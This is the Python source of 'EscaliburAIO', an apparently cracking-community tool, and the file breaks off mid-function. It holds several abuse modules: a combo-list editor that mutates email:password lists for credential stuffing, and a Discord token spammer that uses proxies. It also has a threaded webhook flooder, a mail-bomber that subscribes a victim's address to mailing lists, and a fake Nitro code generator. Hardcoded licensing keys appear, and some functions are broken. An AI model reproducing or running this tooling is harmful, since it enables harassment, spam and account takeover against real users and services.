try:
    try:
        import requests, threading, re, time, sys, os, random, webbrowser, ctypes, json, hashlib, subprocess, pypresence, tkinter, string, urllib
        from colorama import Fore, init
        from re import search
        from tkinter import filedialog, messagebox
        from time import gmtime, strftime
        from pypresence import Presence
        from discord_webhook import DiscordWebhook, DiscordEmbed
        import tkinter as tk
        from tkinter import *
        from bs4 import BeautifulSoup
    except:
        print("Bro if you see this error, the idea of extremedev being a skid its real, actually the coder of this tool its scar, so if you see this i think you are the lucky men that exposed extremeskid, ok dont tell anyone except me ok men bye")
        input("\n\nPress any key to close")
        sys.exit()
    current_version = "v1.1"

    logo = f""" 
    _____               _ _ _                     _    ___ ___  
    | ____|___  ___ __ _| (_) |__  _   _ _ __     / \  |_ _/ _ \  
    |  _| / __|/ __/ _` | | | '_ \| | | | '__|   / _ \  | | | | |
    | |___\__ \ (_| (_| | | | |_) | |_| | |     / ___ \ | | |_| |
    |_____|___/\___\__,_|_|_|_.__/ \__,_|_|    /_/   \_\___\___/ 

                                {current_version}                               """

    module = ""

    root = tkinter.Tk()
    root.withdraw()

    init()

    default_settings = {
        "fast_mode": "false",
        "webhook": "false",
        "webhook-id": "",
        "timeout": "1000"
    }

    if not os.path.exists('config.json'):
        f = open('config.json', 'a+')
        f.close()
        f = open('config.json', 'w')
        json.dump(default_settings, f)
        f.close()

    proxylist = ""

    today = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
    if not os.path.exists("results"):
        os.makedirs(f"results")
    if not os.path.exists(f"results/{today}"):
        os.makedirs(f"results/{today}")
    if not os.path.exists('config.json'):
        print("Please load the 'config.json' file, if you are getting any error please message ExtremeDev..")
        time.sleep(2)
        sys.exit()  

    try:
        ext = json.load(open('config.json'))
        ext['webhook']
        ext['webhook-id']
        ext['fast_mode']
        ext['timeout']
    except:
        print("Please load the 'config.json' file, if you are getting any error please message ExtremeDev..")
        time.sleep(2)
        sys.exit()  

    time22 = time.time()
    err = False
    client_id = '714172320570409088'
    RPC = Presence(client_id=client_id)
    try:
        RPC.connect()
        RPC.update(large_image='image0', details='https://discord.gg/kxbSgFM', start=time22)
    except (pypresence.InvalidPipe, pypresence.InvalidID, pypresence.PyPresenceException):
        err = True

    proxylist = []
    emails = []
    passwords = []
    combos = []
    final = []
    tokens = []
    dorks = []
    urls = []
    result_keywords = []
    edit_words = ["1", "1!", "11", "12", "11!", "$", "#", "@"]
    username = ""
    login_status = 0
    register_status = 0
    apikey = "994149984695142315559171287546996"
    secret = "6YdgakosRbDZDACQUvsS7UduXMDNnO2APOM"
    aid = "196811"
    version1 = "1.0"
    random1 = "python"
    BUF_SIZE = 65536
    md5 = hashlib.md5()
    filehash = md5.hexdigest()
    init()
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()


    cpm1, cpm, good, bad, checked, errors, banned = 0, 0, 0, 0, 0, 0, 0
    lista_mesaje = ["DataTouch - best combo cloud", "RainProxy - best proxies", "Coded by ExtremeDev", "Escalibur will never die."]
    mesaje = random.choice(lista_mesaje)

    def get_string():
        letters = string.ascii_lowercase
        result_str = ''.join(random.choice(letters) for i in range(10))
        return result_str

    def tos():
        os.system("title TOS - EscaliburAIO")
        print("                                                 Terms Of Service\n\n\n            EscaliburAIO does not support any type of cracking activity, and none of EscaliburAIO cracking.\n\n            Any attempt to crack EscaliburAIO will result in a tos break, and your account will be suspended.\n\n                                    This tool is powered by ExtremeDev's codes.\n\n                                                EscaliburAIO Team.\n\n                                         Please enter ENTER to continue.")
        input()

    def webhook(account):
        global errors
        if ext['webhook'] == "true":
            if ext['webhook-id'] == "":
                errors+=1
            else:
                try:
                    today = time.time()
                    webhook = DiscordWebhook(url=ext['webhook-id'], content="| Date: {} | Account: {}".format(today, account), username="EscaliburSupport")
                    response = webhook.execute()
                except:
                    errors+=1


    def hit_stoler():
        print("Sending hits to hits.txt..\n\nThanks for helping us steal your information and mom credit card.")
    def nitro_get(times):
        from random import randint
        if not os.path.exists('results/nitro'):
            os.makedirs('results/nitro')
        while times:
            open('result/nitro/{}.txt'.format(today)).write('discord.gift/{}\n'.format(randint(1000000000000000, 9999999999999999)))
    def gen_nitro():
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print('\n How many codes do you want to generate?')
        try:
            how_many = int(input(' '))
        except:
            print(' Invalid input..')
            time.sleep(2)
            gen_nitro()
        input(' Press enter to start.')        
        nitro_get(how_many)
        print(' Finished!')
        time.sleep(1.5)
        menu()

    def settings():
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        print("  Current Settings..")
        print()
        print("  [t] - Timeout: [{}]".format(ext['timeout']))
        print("  [f] - Fast Mode: [{}]".format(ext['fast_mode']))
        print("  [w] - Webhook: [{}]".format(ext['webhook']))
        print("  [i] - Webhook ID: [{}]".format(ext['webhook-id']))
        print("  [m] - Menu")
        alegere = input("  ").lower()
        if alegere == "":
            print("  Please select a valid input :(")
            time.sleep(2)
            settings()
        elif alegere == "t":
            print("  Select a value for - Timeout")
            try:
                new_amount = int(input("  "))
                ext['timeout'] = new_amount
                settings()
            except:
                print("  Please select a valid input brother")
                time.sleep(2)
                settings()
        elif alegere == "f":
            print("  Select a value for - Timeout")
            try:
                if ext['fast_mode'] == 'false':
                    ext['fast_mode'] = 'true'
                    settings()
                elif ext['fast_mode'] == 'true':
                    ext['fast_mode'] = 'false'
                    settings()
                else:
                    ext['fast_mode'] == 'false'
                    settings()
            except:
                print("Error..")
                time.sleep(2)
                settings()
        elif alegere == "w":
            print("  Select a value for - Timeout")
            try:
                if ext['webhook'] == 'false':
                    ext['webhook'] = 'true'
                    settings()
                else:
                    ext['webhook'] = 'false'
                    settings()
            except:
                print("Error..")
                time.sleep(2)
                settings()
        elif alegere == "i":
            print("  Select a value for - Webhook ID")
            try:
                new_amount = input("  ")
                ext['webhook-id'] = new_amount
                settings()
            except:
                print("  Please select a valid input brother")
                time.sleep(2)
                settings()
        elif alegere == "m":
            menu()
        else:
            print("  Please select a valid input :(")
            time.sleep(2)
            settings() 
    def login_menu():
        os.system('cls')
        os.system("title EscaliburAIO - Login")
        print()
        print(logo + Fore.WHITE)
        print()
        print()
        print("  [1] Login")
        print("  [2] Register")
        option = input("\n")
        if option == "1":
            login()
        elif option == "2":
            register()
        else:
            login_menu()


    def logincheck():
        global username
        if os.path.exists("login.extremedev"):
            with open("login.extremedev", "r+") as dev:
                extreme = dev.readlines()
                for line in extreme:
                    cont = re.search(r'\"Login\":\"(.*?):(.*?)\"', line).groups(2)
                    data = {
                        "type": "login",
                        "aid": aid,
                        "random": random1,
                        'apikey': apikey,
                        "secret": secret,
                        "username": cont[0],
                        "password": cont[1],
                        "hwid": hwid
                    }
                    headers = {"User-Agent": "AuthGG"}
                    with requests.Session() as sess:
                        request_2 = sess.post('https://api.auth.gg/version2/api.php', headers=headers, data=data)
                        if "success" in request_2.text:
                            os.system('cls')
                            os.system("title EscaliburAIO - Login")
                            print()
                            print(logo + Fore.WHITE)
                            print()
                            print(Fore.MAGENTA + "  Trying to login on EscaliburAIO servers.." + Fore.WHITE)
                            time.sleep(1)
                            print("\n  Welcome back, {}!".format(cont[0]))
                            username = cont[0]
                            time.sleep(2)
                            menu()
                        else:
                            if "invalid_details" in request_2.text:
                                print("\n  Please check your credentials!")
                            elif "invalid_hwid" in request_2.text:
                                print("\n  Invalid HWID, please do not attempt to share accounts!")
                            elif "hwid_updated" in request_2.text:
                                print("\n  Your HWID has been updated, relogin!")
                            elif "time_expired" in request_2.text:
                                print("\n  Your subscription has expired!")
                            elif "net_error" in request_2.text:
                                print("\n  Something went wrong!")
                            else:
                                print("\n  Something went wrong!")
                            time.sleep(2)
                            os._exit(0)


        else:
            login_menu()

    def login():
        if login_status == 0:
            os.system('cls')
            os.system("title EscaliburAIO - Login")
            print()
            print(logo + Fore.WHITE)
            print()
            print()
            username = input("  Enter Username: ")
            password = input("  Enter Password: ")
            data = {
                "type": "login",
                "aid": aid,
                "random": random1,
                'apikey': apikey,
                "secret": secret,
                "username": username,
                "password": password,
                "hwid": hwid
            }
            headers = {"User-Agent": "AuthGG"}
            with requests.Session() as sess:
                request_2 = sess.post('https://api.auth.gg/version2/api.php', headers=headers, data=data)
                if "success" in request_2.text:
                    with open("login.extremedev", "a+") as dev:
                        dev.write("\"Login\":\"{}:{}\"".format(username, password))
                    print("\n  Welcome back, {}!".format(username))
                    time.sleep(2)
                    menu()
                else:
                    if "invalid_details" in request_2.text:
                        print("\n  Please check your credentials!")
                    elif "invalid_hwid" in request_2.text:
                        print("\n  Invalid HWID, please do not attempt to share accounts!")
                    elif "hwid_updated" in request_2.text:
                        print("\n  Your HWID has been updated, relogin!")
                    elif "time_expired" in request_2.text:
                        print("\n  Your subscription has expired!")
                    elif "net_error" in request_2.text:
                        print("\n  Something went wrong!")
                    else:
                        print("\n  Something went wrong!")
                    time.sleep(2)
                    os._exit(0)
        else:
            messagebox.showerror("EscaliburAIO", "Our panels are down, please contact any admin..")
            os._exit(0)  

    def register():
        os.system('cls')
        os.system("title EscaliburAIO - Register")
        if register_status == 0:
            os.system('cls')
            print()
            print(logo + Fore.WHITE)
            print()
            print()
            token = input("  Please enter token: ")
            os.system('cls')
            print()
            print(logo + Fore.WHITE)
            print()
            print()
            email = input("  Please enter email: ")
            os.system('cls')
            print()
            print(logo + Fore.WHITE)
            print()
            print()
            username = input("  Please enter username: ")
            os.system('cls')
            print()
            print(logo + Fore.WHITE)
            print()
            print()
            password = input("  Please enter password: ")
            headers = {"User-Agent": "AuthGG"}
            data = {
                "type": "register",
                "aid": aid,
                "random": random1,
                'apikey': apikey,
                "secret": secret,
                "username": username,
                "password": password,
                "email": email,
                "token": token,
                "hwid": hwid
            }
            try:
                with requests.Session() as sess:
                    request_3 = sess.post('https://api.auth.gg/version2/api.php', data=data, headers=headers)
                    if "success" in request_3.text:
                        print(f"\n {username}, you have successfully registered!")
                        time.sleep(2)
                        os._exit(0)
                    else:
                        if "invalid_token" in request_3.text:
                            print("\n Token invalid or already used")
                        elif "invalid_username" in request_3.text:
                            print("\n Username already taken, please choose another one")
                        elif "email_used" in request_3.text:
                            print('\n Email is invalid or in use!')
                        else:
                            print("\n Something went wrong!")
                        time.sleep(2)
                        os._exit(0)
            except:
                messagebox.showerror("EscaliburAIO", "Our panels are down, please contact any admin..")
                os._exit(0)      
        else:
            messagebox.showerror("EscaliburAIO", "Our panels are down, please contact any admin..")
            os._exit(0)

    def upload_scraper():
        print()

    def load_accounts():
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        emails.clear()
        passwords.clear()
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        input(" Press ENTER to select combos..")
        fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',
                                    filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameCombo is None:
            print(" Please select combos..")
            time.sleep(2)
            load_accounts()
        else:
            with open(fileNameCombo.name,'r+', encoding='utf-8') as f:
                for x in f.readlines():
                    try:
                        emails.append(x.split(":")[0].replace('\n',''))
                        passwords.append(x.split(":")[1].replace('\n',''))
                        xd = x.split()[0].replace('\n', '')
                        combos.append(xd)
                    except:
                        pass

    def keyword_gen():
        global result_keywords
        result_keywords.clear()
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n What target do you have (word)")
        keke = input("\n ")
        print("\n How many times to generate (recommanded 5/10)")
        try:
            how_many_times = int(input("\n "))
        except:
            print("\n Please enter a number..")
            time.sleep(1)
            keyword_gen()
        keyword = keke.split()[0]
        print("\n Generating..")
        for each in "abcdefghijklmnopqrstuvwxyz123456789":
            from random import randint
            for x in range(int(how_many_times)):
                value = randint(1,1000000000)
                api = "https://suggestqueries.google.com/complete/search?client=chrome&q={}%20{}&jsonp=jsonpCB&_={}".format(keyword, each, value)
                r = requests.get(api)
                try:
                    result = search(r',\[\"(.*?)\],\[\"', str(r.text)).group(1)
                    f = result.split("\",\"")
                    for each in f:
                        if each.endswith("\""):
                            result_keywords.append(each.split("\"")[0])
                        else:
                            result_keywords.append(each)
                except:
                    pass
        for each in result_keywords:
            open("results/{}/keyword.txt".format(today), "a+").write("{}\n".format(each))
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Generated succesfully!")
        time.sleep(2)
        menu()
    def save(accs):
        from datetime import datetime
        today1 = datetime.now()
        current = today1.strftime("%d-%m-%Y-%H-%M-%S")
        os.makedirs("results/{}/".format(current))
        resultfile = open("results/{}/edited.txt".format(current), "a",encoding="utf-8")
        for each in accs:
            resultfile.write(each)
        resultfile.close()
        final.clear()
        combos.clear()
        print(" Finished editing..")
        print()
        input(" Press any key to go on menu..")
        menu()

    def spammer_check():
        load_tokens()
        load_proxies()
        global tokens, proxylist
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Please enter the link of the group:")
        before_link = input(" ")
        if len(before_link) > 6:
            try:
                link = before_link.split("discord.gg/")[1]
            except:
                print(" Error found..")
                time.sleep(2)
                spammer_check()
        else:
            link = before_link
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print("\n Please enter the Channel ID: ")
        try:
            channel_id = int(input(" "))
        except:
            print(" Select a valid channel id..")
            time.sleep(2)
            spammer_check()
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje))) 
        print(" Please select a message to send: ")
        message = input(" ")
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje))) 
        print(" How many times do you want to spam")
        try:
            times = int(input(" "))
        except:
            print(" Please select a valid input..")
            time.sleep(2)
            spammer_check()
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje))) 
        print(" All setup.")
        print("\n =================================")
        print(" Server link: https://discord.gg/{}/\n Channel id: {}\n Message: {}\n Times: {}\n =================================".format(link, str(channel_id), message, str(times))) 
        spammer(tokens, link, channel_id, message, proxylist, times)
    def spammer(tokens, link, channel_id, message, proxylist, times):
        for x in range(int(times)):
            token = random.choice(tokens)
            try:
                proxy1 = random.choice(proxylist)
                proxy = {'http': f'http://{proxy1}', 'https': f'https://{proxy1}'}
                api = "https://discordapp.com/api/v6/invites/" + str(link)
                headers = {
                    "authorization":token,
                    "user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.306 Chrome/78.0.3904.130 Electron/7.1.11 Safari/537.36",
                    "content-type":"application/json"
                }
                r = requests.post(api, headers=headers, proxies=proxy)
                if r.status_code == 200:
                    url = "https://discordapp.com/api/channels/{}/messages".format(channel_id)
                    r = requests.post(url, headers=headers, json={"content": message}, proxies=proxy)
                    if r.status_code == 200:
                        print(" {}. Sent.".format(x))
                    else:
                        print(" {}. Error at sending message.".format(x))
                else:
                    print(" {}. Invalid Token.".format(x))
            except:
                print(" {}. Proxy Error.".format(x))
                pass
                
        print(" Finished.")
        time.sleep(2)
        menu()

    def edit1():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    for each in edit_words:
                        username = email.split("@")[0]
                        after = email.split("@")[1]
                        save1 = f"{username}@{after}:{password}{each}\n"
                        save12 = f"{username}{each}@{after}:{password}\n"
                        final.append(save1)
                        final.append(save12)
                except:
                    pass
            except:
                pass

    def edit2():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    username = email.split("@")[0]
                    save1 = f"{username}:{password}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit3():
        global combos, final
        print("Maximum characters:")
        try:
            maximum = int(input(""))
        except ValueError:
            print(" Invalid option")
            time.sleep(2)
            menu()
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    username = email.split("@")[0]
                    aftere = email.split("@")[1]
                    if len(username) > int(maximum):
                        save1 = f"{email}:{password}\n"
                        final.append(save1)
                    else:
                        pass
                except:
                    try:
                        if len(email) > int(maximum):
                            save1 = f"{email}:{password}\n"
                            final.append(save1)
                        else:
                            pass
                    except:
                        pass
            except:
                pass

    def edit4():
        global combos, final
        try:
            final1 = list(dict.fromkeys(combos))
            for each in final1:
                try:
                    afters = f"{each}\n"
                    final.append(afters)
                except:
                    pass
        except:
            pass
    def edit5():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    pass_af = password.capitalize()
                    save1 = f"{email}:{pass_af}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit6():
        global combos, final
        print(" Please write the word you want to add after password:")
        word = input(" ")
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    save1 = f"{email}:{password}{word}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit7():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    username = email.split("@")[0]
                    after = email.split("@")[1]
                    save1 = f"{password}{after}:{username}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit8():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    username = email.split("@")[0]
                    after = email.split("@")[1]
                    save1 = f"{password}:{email}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit9():
        global combos, final
        print(" With what you want to change the \':\'?")
        word = input(" ")
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    save1 = f"{email}{word}{password}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit10():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    email_af = email.capitalize()
                    save1 = f"{email_af}:{password}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit11():
        global combos, final
        print(" What is your domain you gonna use?")
        domain_n = input("")
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    save1 = f"{email}@{domain_n}:{password}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit12():
        global combos, final
        print(" Enter 4 words, example: 'word|word2|word3|word4\n\n The format will be `<word1>email<word2>:<word3>password<word4>")
        domain_n = input("")
        domains = domain_n.split("|")
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    save1 = f"{domains[0]}{email}{domains[1]}@{domain_n}:{domains[2]}{password}{domains[3]}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit13():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                try:
                    save1 = f"{email}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit14():
        global combos, final
        for each in combos:
            try:
                password = each.split(":")[1]
                try:
                    save1 = f"{password}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def edit15():
        global combos, final
        for each in combos:
            try:
                email = each.split(":")[0]
                password = each.split(":")[1]
                try:
                    before, after = email.split("@")[0], email.split("@")[1]
                    domain_extension = after.split(".")[1]
                    domain_extension_before = after.split(".")[0]
                    save1 = f"{domain_extension_before}@{before}.{domain_extension}:{password}\n"
                    final.append(save1)
                except:
                    pass
            except:
                pass

    def proxy_get(proxy_type):
        global proxy_line
        try:
            if proxy_type == "https" or "http":
                proxyz = random.choice(proxylist)
                splitt = proxyz.split(":")
                if len(splitt) == 4:
                    proxy_line = {"http": "http://{}:{}@{}:{}".format(splitt[2], splitt[3], splitt[0], splitt[1]), "https": "https://{}:{}@{}:{}".format(splitt[2], splitt[3], splitt[0], splitt[1])}
                elif len(splitt) == 2:
                    proxy_line = {"http": "http://{}".format(proxyz), "https": "https://{}".format(proxyz)}
            if proxy_type == "socks4":
                proxyz = random.choice(proxylist)
                splitt = proxyz.split(":")
                if len(splitt) == 4:
                    proxy_line = {"http": "socks4://{}:{}@{}:{}".format(splitt[2], splitt[3], splitt[0], splitt[1])}
                elif len(splitt) == 2:
                    proxy_line = {"http": "socks4://{}".format(proxyz)}
            if proxy_type == "socks5":
                proxyz = random.choice(proxylist)
                splitt = proxyz.split(":")
                if len(splitt) == 4:
                    proxy_line = {"http": "socks5://{}:{}@{}:{}".format(splitt[2], splitt[3], splitt[0], splitt[1])}
                elif len(splitt) == 2:
                    proxy_line = {"http": "socks5://{}".format(proxyz)}
            else:
                proxyz = random.choice(proxylist)
                splitt = proxyz.split(":")
                if len(splitt) == 4:
                    proxy_line = {"http": "http://{}:{}@{}:{}".format(splitt[2], splitt[3], splitt[0], splitt[1]), "https": "https://{}:{}@{}:{}".format(splitt[2], splitt[3], splitt[0], splitt[1])}
                elif len(splitt) == 2:
                    proxy_line = {"http": "http://{}".format(proxyz), "https": "https://{}".format(proxyz)}
            
        except:
            pass

    def load_tokens():
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        input(" Press ENTER to select tokens..")
        fileNameTokens = filedialog.askopenfile(parent=root, mode='rb', title='Choose a tokens file',
                                    filetype=((".txt", "*.txt"), ("All files", "*.txt")))
        if fileNameTokens is None:
            print(" Please select tokens..")
            time.sleep(2)
            load_tokens()
        else:
            with open(fileNameTokens.name, 'r+') as n:
                proxypath = n.readlines()
                for linie_proxy in proxypath:
                    try:
                        tokens.append(linie_proxy.split()[0].replace('\n',''))
                    except:
                        pass

    def load_dorks():
        os.system("cls")
        dorks.clear()
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        input(" Press ENTER to select dorks..")
        fileNameDorks = filedialog.askopenfile(parent=root, mode='rb', title='Choose a dorks file',
                                    filetype=((".txt", "*.txt"), ("All files", "*.txt")))
        if fileNameDorks is None:
            print(" Please select dorks..")
            time.sleep(2)
            load_dorks()
        else:
            with open(fileNameDorks.name, 'r+') as n:
                proxypath = n.readlines()
                for linie_proxy in proxypath:
                    try:
                        dorks.append(linie_proxy.replace('\n',''))
                    except:
                        pass
            print("\n Loaded {} dork lines.".format(len(dorks)))
            time.sleep(2)

    def load_proxies():
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        proxylist.clear()
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"".format(random.choice(lista_mesaje)))
        print()
        input(" Press ENTER to select proxies..")
        fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file (http/s)',
                                    filetype=((".txt", "*.txt"), ("All files", "*.txt")))
        if fileNameProxy is None:
            print(" Please select proxies..")
            time.sleep(2)
            load_proxies()
        else:
            with open(fileNameProxy.name, 'r+') as n:
                proxypath = n.readlines()
                for linie_proxy in proxypath:
                    try:
                        proxylist.append(linie_proxy.split()[0].replace('\n',''))
                    except:
                        pass

    def webhook_screen(webhookid, message, threads, times):
        global cpm, bad, good, cpm1, errors
        cpm1 = cpm
        cpm = 0
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        proxylist.clear()
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje)))
        print(" Webhook that will be raped: {}".format(webhookid))
        print(" Spamming your webhook with the message: {}".format(message))
        print(" Message sending {} times".format(times))
        print(" Threads using: {}".format(threads))
        ctypes.windll.kernel32.SetConsoleTitleW(f'Sent: {good} | Error: {errors} | CPM: {cpm1*60}')
        time.sleep(1)
        threading.Thread(target=webhook_screen, args=(webhookid, message, threads, times,)).start()

    def webhook_spammer(webhookid, message, threads, times):
        global bad, good, cpm, errors, checked, banned
        try:
            webhook = DiscordWebhook(url=webhookid, content=message)
            response = webhook.execute()
            if response.status_code == 429:
                bad+=1
                threading.Thread(target=webhook_spammer, args=(webhookid, message, threads, times,)).start()
            else:
                cpm+=1
                good+=1
        except:
            errors+=1
            threading.Thread(target=webhook_spammer, args=(webhookid, message, threads, times,)).start()
    def webhook_start():
        global checked
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        proxylist.clear()
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje)))
        print(" Webhook link:")
        webhookid = input(" ")
        print(" Message that you want to use:")
        message = input(" ")
        print(" How many times do you want to send the message?")
        try:
            times = int(input(" "))
        except:
            print(" Please enter a valid input..")
            time.sleep(2)
            webhook_start()
        print(" How many threads do you want to use?")
        try:
            threads = int(input(" "))
        except:
            print(" Please enter a valid input..")
            time.sleep(2)
            webhook_start()
        webhook_screen(webhookid, message, threads, times)
        num = 0
        while 1:
            if checked < times:
                if threading.active_count() < int(threads):
                    threading.Thread(target=webhook_spammer, args=(webhookid, message, threads, times,)).start()
                    num += 1

    def spam_email(email):
        global errors, good, bad, checked, banned, cpm
        try:
            sess = requests.Session()
            content = "email={}&fullname={}&pw={}&pw-conf={}&digest=1&email-button=Subscribe".format(email, email, email, email)

            r = sess.post("https://lists.vmware.com/mailman/subscribe/security-announce", data=content, allow_redirects=True)
            r = sess.post("https://chilli.nosignal.org/cgi-bin/mailman/subscribe/uknot", data=content, allow_redirects=True)
            r = sess.post("https://www.audifans.com/mailman/subscribe/offtopic", data=content, allow_redirects=True) 
            good+=1
            checked+=1
            cpm+=1
            print(" Email Sent!")
            print(" Email Sent!")
            print(" Email Sent!")
        except:
            errors+=1
            threading.Thread(target=spam_email, args=(email,)).start()
            

    def email_spammer():
        global checked
        os.system("cls")
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | Future AIO")
        proxylist.clear()
        print("\n" + logo + "\n")
        print(" EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje)))
        print("\n What email do you want to spam?")
        email = input(" ")
        print(" How many times?")
        try:
            times = int(input(" "))
        except:
            print(" Please enter a valid input..")
            time.sleep(2)
            email_spammer()
        print(" How many threads do you want to use?")
        try:
            threads = int(input(" "))
        except:
            print(" Please enter a valid input..")
            time.sleep(2)
            email_spammer()
        print(" Aight spamming {} for {} times.".format(email, str(times)))
        time.sleep(1)
        num = 0
        while 1:
            if checked < times:
                if threading.active_count() < int(threads):
                    threading.Thread(target=spam_email, args=(email,)).start()
                    num += 1
    def proxy_screen():
        global bad, good, cpm, cpm1, errors, checked, banned, module
        os.system("cls")
        cpm1 = cpm
        cpm = 0
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | {} | Checked: {}/{} | Good: {} | Bad: {} |".format(module, checked, len(emails), good, bad))
        text_logo = "\n" + logo + "\n"
        text = " EscaliburAIO - \"{}\"\n".format(random.choice(lista_mesaje))
        text2 = " [Checked] = [{}/{}]".format(checked, len(proxylist))
        text4 = " [Good] = [{}]".format(Fore.GREEN + str(good) + Fore.WHITE)
        text5 = " [Bad] = [{}]".format(Fore.RED + str(bad) + Fore.WHITE)
        text6 = " [Ip Banned] = [{}]".format(Fore.CYAN + str(banned) + Fore.WHITE)
        text7 = " [Errors] = [{}]".format(Fore.LIGHTBLACK_EX + str(errors) + Fore.WHITE)
        text8 = " [CPM] = [{}]".format(Fore.BLUE + str(cpm1*60) + Fore.WHITE)
        print(text_logo)
        for char1 in text:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text2:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text4:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text5:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text6:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text7:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        for char1 in text8:
            sys.stdout.write(char1)
            sys.stdout.flush()
            time.sleep(0.005)
        print()
        threading.Thread(target=proxy_screen, args=()).start()

    def dork_screen():
        global bad, good, cpm, cpm1, errors, checked, banned, module
        os.system("cls")
        cpm1 = cpm
        cpm = 0
        ctypes.windll.kernel32.SetConsoleTitleW("EscaliburAIO | {} | Checked: {}/{} | Good: {} | Bad: {} |".format(module, checked, len(dorks), good, bad))
        text_logo = "\n" + logo + "\n"
